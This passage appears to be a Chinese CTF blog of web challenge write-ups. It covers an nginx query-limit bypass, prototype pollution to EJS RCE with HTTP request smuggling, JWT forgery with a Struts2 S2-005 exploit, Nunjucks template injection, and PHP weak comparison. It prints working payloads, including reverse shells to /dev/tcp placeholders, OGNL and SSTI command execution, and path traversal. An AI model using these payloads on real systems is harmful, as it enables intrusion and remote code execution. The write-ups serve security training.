class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  req.query.proxy.includes(<span class="string">&quot;nginx&quot;</span>)</span><br><span class="line">    ? res.status(<span class="number">400</span>).sesnd(<span class="string">&quot;Access here directly, not via nginx :(&quot;</span>)</span><br><span class="line">    : res.send(<span class="string">`Congratz! You got a flag: <span class="subst">$&#123;FLAG&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(&#123; <span class="attr">port</span>: PORT, <span class="attr">host</span>: <span class="string">&quot;0.0.0.0&quot;</span> &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Server listening at <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>如果<code>req.query.proxy</code>这个列表中不包含<code>nginx</code>即输出<code>flag</code></p>
<p>然后再看<code>nginx</code>的配置<code>default.conf</code></p>
<figure class="highlight json"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen 8080 default_server;</span><br><span class="line">  server_name nginx;</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    set $args <span class="attr">&quot;$&#123;args&#125;&amp;proxy=nginx&quot;</span>;</span><br><span class="line">    proxy_pass http:<span class="comment">//web:3000;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到会默认给传入的<code>$args</code>进行拼接<code>proxy=nginx</code>，那么这样在<code>proxy</code>中就必定含有<code>nginx</code></p>

        <h3 id="2-漏洞分析"   >
          <a href="#2-漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h3>
      <p>源代码中调用的库为JS的标准库<code>req.query.proxy.includes(&quot;nginx&quot;)</code>，其<code>query</code>下的参数个数默认配置为1000，如果超过，就只会解析前1000个参数，在如下仓库：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/ljharb/qs/tree/main/dist" >qs/dist at main · ljharb/qs (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114194250871.png" alt="image-20221114194250871"></p>
<p>所以我们可以这样写，当<code>proxy</code>的个数超过1000就会导致<code>index.js</code>代码中的拼接的<code>proxy=nginx</code>无法解析到，成功完成<code>proxy</code>的覆盖</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?proxy=a&amp;proxy=a&amp;proxy=a&amp;proxy=a&amp;proxy=a...</span><br></pre></td></tr></table></div></figure>

<p>但是<code>proxy</code>的个数也不能太多，太多的话会导致<code>url</code>太长，出现如下情况，这个是由于<code>nginx</code>的限制</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221114214652469.png" alt="image-20221114214652469"></p>
<p>那么我们改改即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?proxy=a&amp;m=a&amp;m=a&amp;m=a&amp;m=a...&amp;m=a...</span><br></pre></td></tr></table></div></figure>

<p>这样就会使得参数超过1000个但是<code>url</code>长度也不会太长。</p>

        <h1 id="西湖论剑2023"   >
          <a href="#西湖论剑2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#西湖论剑2023" class="headerlink" title="西湖论剑2023"></a>西湖论剑2023</h1>
      
        <h2 id="real-ez-node"   >
          <a href="#real-ez-node" class="heading-link"><i class="fas fa-link"></i></a><a href="#real-ez-node" class="headerlink" title="real_ez_node"></a>real_ez_node</h2>
      
        <h3 id="原型链污染漏洞"   >
          <a href="#原型链污染漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#原型链污染漏洞" class="headerlink" title="原型链污染漏洞"></a>原型链污染漏洞</h3>
      <p><code>./src/routes/index.js</code>中</p>
<p>首先在<code>copy</code>路径中，由于<code>safeobj.expand</code>存在原型链污染漏洞</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.body)</span><br><span class="line">        <span class="keyword">if</span>(!index.includes(<span class="string">&quot;__proto__&quot;</span>))</span><br><span class="line">            safeobj.expand(user, index, req.body[index]);</span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></div></figure>

<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1#reply-list" >深入理解 JavaScript Prototype 污染攻击 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>该函数<code>expand</code>代码如下</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">expand: <span class="function"><span class="keyword">function</span> (<span class="params">obj, path, thing</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!path || <span class="keyword">typeof</span> thing === <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    obj = isObject(obj) &amp;&amp; obj !== <span class="literal">null</span> ? obj : &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> props = path.split(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (props.length === <span class="number">1</span>) &#123;</span><br><span class="line">        obj[props.shift()] = thing;<span class="comment">//从左数取第一个</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> prop = props.shift();</span><br><span class="line">        <span class="keyword">if</span> (!(prop <span class="keyword">in</span> obj)) &#123;</span><br><span class="line">            obj[prop] = &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        _safe.expand(obj[prop], props.join(<span class="string">&#x27;.&#x27;</span>), thing);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>通过如下代码简单调试一下</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12053" >关于Prototype Pollution Attack的二三事 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> safeObj = <span class="built_in">require</span>(<span class="string">&quot;safe-obj&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + &#123;&#125;.polluted);</span><br><span class="line">safeObj.expand(obj, <span class="string">&#x27;__proto__.polluted&#x27;</span>, <span class="string">&#x27;Yes! Its Polluted&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + &#123;&#125;.polluted);</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204164445320.png" alt="image-20230204164445320"></p>
<p>即可知道，该函数的作用就是将<code>obj.path</code>赋值为<code>thing</code>，使用的是递归方式进行相关属性的寻找赋值。</p>
<p>那么就可以通过该函数，给基类<code>object</code>添加某个属性，或者修改某个属性，从而造成所有的对象相关的属性都会被修改掉。</p>
<p>而对于题目中的<code>req.body[index]</code>，这个就是我们包的<code>POST</code>的数据，是可控的。</p>

        <h3 id="配合ejs进行RCE"   >
          <a href="#配合ejs进行RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#配合ejs进行RCE" class="headerlink" title="配合ejs进行RCE"></a>配合<code>ejs</code>进行<code>RCE</code></h3>
      <p>在<code>./src/app.js</code>中用到了<code>ejs</code>进行模板渲染</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165526170.png" alt="image-20230204165526170"></p>
<p>对于<code>ejs</code>进行渲染时，调用的是<code>compile </code>方法，结合原型链污染漏洞，可以造成<code>RCE</code>，可参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/248170#h3-1" >从 Lodash 原型链污染到模板 RCE-安全客 - 安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>即污染掉<code>compile</code>方法中的<code>opts.outputFunctionName</code>，那么在渲染时，就会将污染之后的字符串和<code>prepended</code>进行拼接，在之后渲染的时候就能够执行到污染的字符串中的<code>js</code>代码，完成<code>RCE</code>的利用。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230204165929533.png" alt="image-20230204165929533"></p>
<p>常见<code>POC</code></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="SSRF的利用"   >
          <a href="#SSRF的利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#SSRF的利用" class="headerlink" title="SSRF的利用"></a>SSRF的利用</h3>
      <p>在前面的<code>copy</code>方法中有个<code>ip</code>检测</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ip.includes(<span class="string">&#x27;127.0.0.1&#x27;</span>)) <span class="keyword">return</span>;</span><br></pre></td></tr></table></div></figure>

<p>需要绕过这个检测才能进行原型链污染的漏洞利用，这里就用到了在某些<code>nodejs</code>版本下的<code>http.get()</code>这个方法的利用了。题目是<code>8.1.2</code>，可以自己用下述代码进行测试某些版本能不能用</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/test&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;get test&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/curl&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://127.0.0.1:12345/?q=&#x27;</span> + q;</span><br><span class="line">        http.get(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.listen(<span class="number">12345</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> host = server.address().address</span><br><span class="line">    <span class="keyword">var</span> port = server.address().port</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;应用实例，访问地址为 http://%s:%s&quot;</span>, host, port)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">module</span>.exports = app;</span><br></pre></td></tr></table></div></figure>

<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.le31ei.top/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/" >nodejs请求走私与ssrf | blog (le31ei.top)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>这个方法利用的原理就是<code>Unicode</code>转换的关系，详情见：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894" >通过拆分攻击实现的SSRF攻击 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>可以看到在<code>curl</code>路径中，使用到了<code>http.get()</code></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/routes/index.js</span></span><br><span class="line">router.get(<span class="string">&#x27;/curl&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.query.q;</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        http.get(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123; </span><br><span class="line">    <span class="comment">// ......</span></span><br></pre></td></tr></table></div></figure>

<p>那么使用脚本构造下走私的<code>Http</code>包即可，该脚本是战队里学弟写的</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">data = <span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span></span><br><span class="line">data = <span class="string">f&quot;constructor.prototype.outputFunctionName=<span class="subst">&#123;quote(data)&#125;</span>&quot;</span></span><br><span class="line">req = <span class="string">&quot;1 HTTP/1.1\r\n\r\n&quot;</span></span><br><span class="line">req += <span class="string">&quot;POST /copy HTTP/1.1\r\n&quot;</span></span><br><span class="line">req += <span class="string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span></span><br><span class="line">req += <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>\r\n&quot;</span></span><br><span class="line">req += <span class="string">f&quot;\r\n<span class="subst">&#123;data&#125;</span>\r\n\r\n&quot;</span></span><br><span class="line">req = req.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\u0120&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\u010d&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;\u010a&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(quote(req))</span><br></pre></td></tr></table></div></figure>

<p>设置一下<code>IP/PORT</code>即可反弹<code>Shell</code></p>
<p>需要注意的是，这个<code>SSRF</code>走私的数据包只能在内网中用，不能添加比如说<code>Host:</code>字段来出网。</p>

        <h1 id="CTF2023"   >
          <a href="#CTF2023" class="heading-link"><i class="fas fa-link"></i></a><a href="#CTF2023" class="headerlink" title="*CTF2023"></a>*CTF2023</h1>
      
        <h2 id="jwt2struts"   >
          <a href="#jwt2struts" class="heading-link"><i class="fas fa-link"></i></a><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h2>
      <p>访问之后给提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180147150.png" alt="image-20230729180147150"></p>
<p>接着访问</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180206893.png" alt="image-20230729180206893"></p>

        <h3 id="1-hash扩展长度攻击"   >
          <a href="#1-hash扩展长度攻击" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-hash扩展长度攻击" class="headerlink" title="1.hash扩展长度攻击"></a>1.hash扩展长度攻击</h3>
      <p>属于是hash扩展长度攻击了，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116779357" >https://blog.csdn.net/LYJ20010728/article/details/116779357</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>具体步骤如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180433572.png" alt="image-20230729180433572"></p>
<p>发送POST包如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180513310.png" alt="image-20230729180513310"></p>
<p>得到key为sk-he00lctf3r</p>
<p>结合最开始访问的提示，包括题目名称</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180551778.png" alt="image-20230729180551778"></p>
<p>应该是需要修改JWT令牌为admin，最开始访问网站抓包可以看到默认会给user的JWT令牌，那么现在有key，就可以生成admin的JWT令牌</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729180733485.png" alt="image-20230729180733485"></p>

        <h3 id="2-JWT令牌"   >
          <a href="#2-JWT令牌" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-JWT令牌" class="headerlink" title="2.JWT令牌"></a>2.JWT令牌</h3>
      <p>按照如下步骤可对user的JWT令牌进行验证</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/zengjindong/p/14286529.html" >如何使用在线工具手动验证JWT签名 - 曾昊 - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/q95548854/article/details/103907825" >(64条消息) 全栈之初识JWT – Web安全的守护神_eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyjyzwdpc_张兴华(MarsXH.Chang)的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>提取user的JWT令牌，用cyberchef的base64查看即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181008635.png" alt="image-20230729181008635"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181027419.png" alt="image-20230729181027419"></p>
<p>然后将user改为admin，base64得到JWT令牌的头部和载荷</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181229611.png" alt="image-20230729181229611"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181300249.png" alt="image-20230729181300249"></p>
<p>去掉其中的”=”号，然后依据头部(header).载荷(payload)的顺序准备进行加密，网站为<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://cryptii.com/" >Modular conversion, encoding and encryption online - cryptii</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181602274.png" alt="image-20230729181602274"></p>
<p>将得到的最终结果放入access_token中发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729181807831.png" alt="image-20230729181807831"></p>
<p>返回了一个Location，访问如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182035159.png" alt="image-20230729182035159"></p>

        <h3 id="3-struts2框架漏洞"   >
          <a href="#3-struts2框架漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-struts2框架漏洞" class="headerlink" title="3.struts2框架漏洞"></a>3.struts2框架漏洞</h3>
      <p>结合题目提示，应该是struts2漏洞，依据如下网址挨个尝试POC</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_53972936/article/details/127590995" >(64条消息) 【渗透测试】Struts2系列漏洞_struts2漏洞_离陌lm的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其中<strong>S2-005</strong>漏洞可以成功，成功执行命令，POC为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;ls&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></div></figure>

<p>其中ls即可随意更改执行命令，右键查看源代码即可看到返回的结果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182336645.png" alt="image-20230729182336645"></p>
<p>输入命令env即可得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230729182410190.png" alt="image-20230729182410190"></p>

        <h1 id="DeconstruCTF"   >
          <a href="#DeconstruCTF" class="heading-link"><i class="fas fa-link"></i></a><a href="#DeconstruCTF" class="headerlink" title="DeconstruCTF"></a>DeconstruCTF</h1>
      
        <h2 id="gitcha"   >
          <a href="#gitcha" class="heading-link"><i class="fas fa-link"></i></a><a href="#gitcha" class="headerlink" title="gitcha"></a>gitcha</h2>
      <p>dirsearch发现有.git，泄露之后发现源码，审计代码，设置Cookie</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193032520.png" alt="image-20230806193032520"></p>
<p>可以通过document.进行设置</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=”SECRET_COOKIE_VALUE=thisisahugesecret″;=</span><br></pre></td></tr></table></div></figure>

<p>然后显示note信息的函数中存在nunjucks模板注入，也可以通过输入框输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7+7&#125;&#125;</span><br></pre></td></tr></table></div></figure>

<p>来进行测试，如果返回结果14，则存在模板注入</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12264" >从一道题目学习Nunjucks模板 - 先知社区 (aliyun.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806193102087.png" alt="image-20230806193102087"></p>
<p>如下payload执行代码，cat flag</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;range.constructor(&quot;return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat flag&#x27;).toString()&quot;)()&#125;&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="why-are-types-weird"   >
          <a href="#why-are-types-weird" class="heading-link"><i class="fas fa-link"></i></a><a href="#why-are-types-weird" class="headerlink" title="why-are-types-weird"></a>why-are-types-weird</h2>
      <p>写一半，dirsearch之后显示源码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;but_submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;txt_uname&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;txt_pwd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid username&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hash(<span class="string">&#x27;sha1&#x27;</span>, <span class="variable">$password</span>) == <span class="string">&quot;0&quot;</span>) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        header(<span class="string">&quot;Location: admin.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Invalid password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>存在”0”的弱比较，参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/spaze/hashes" >spaze/hashes: Magic hashes – PHP hash “collisions” (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230806194845949.png" alt="image-20230806194845949"></p>
<p>其中提供sha1的弱比较sha字符串，即可登录。</p>

        <h1 id="WEB小技巧"   >
          <a href="#WEB小技巧" class="heading-link"><i class="fas fa-link"></i></a><a href="#WEB小技巧" class="headerlink" title="WEB小技巧"></a>WEB小技巧</h1>
      <p>Imagefile?url1=file:///%25%36%36%25%36%63%25%36%31%25%36%37%23java</p>
<p>/admin/..//..//..//..//..//..//..//flag</p>
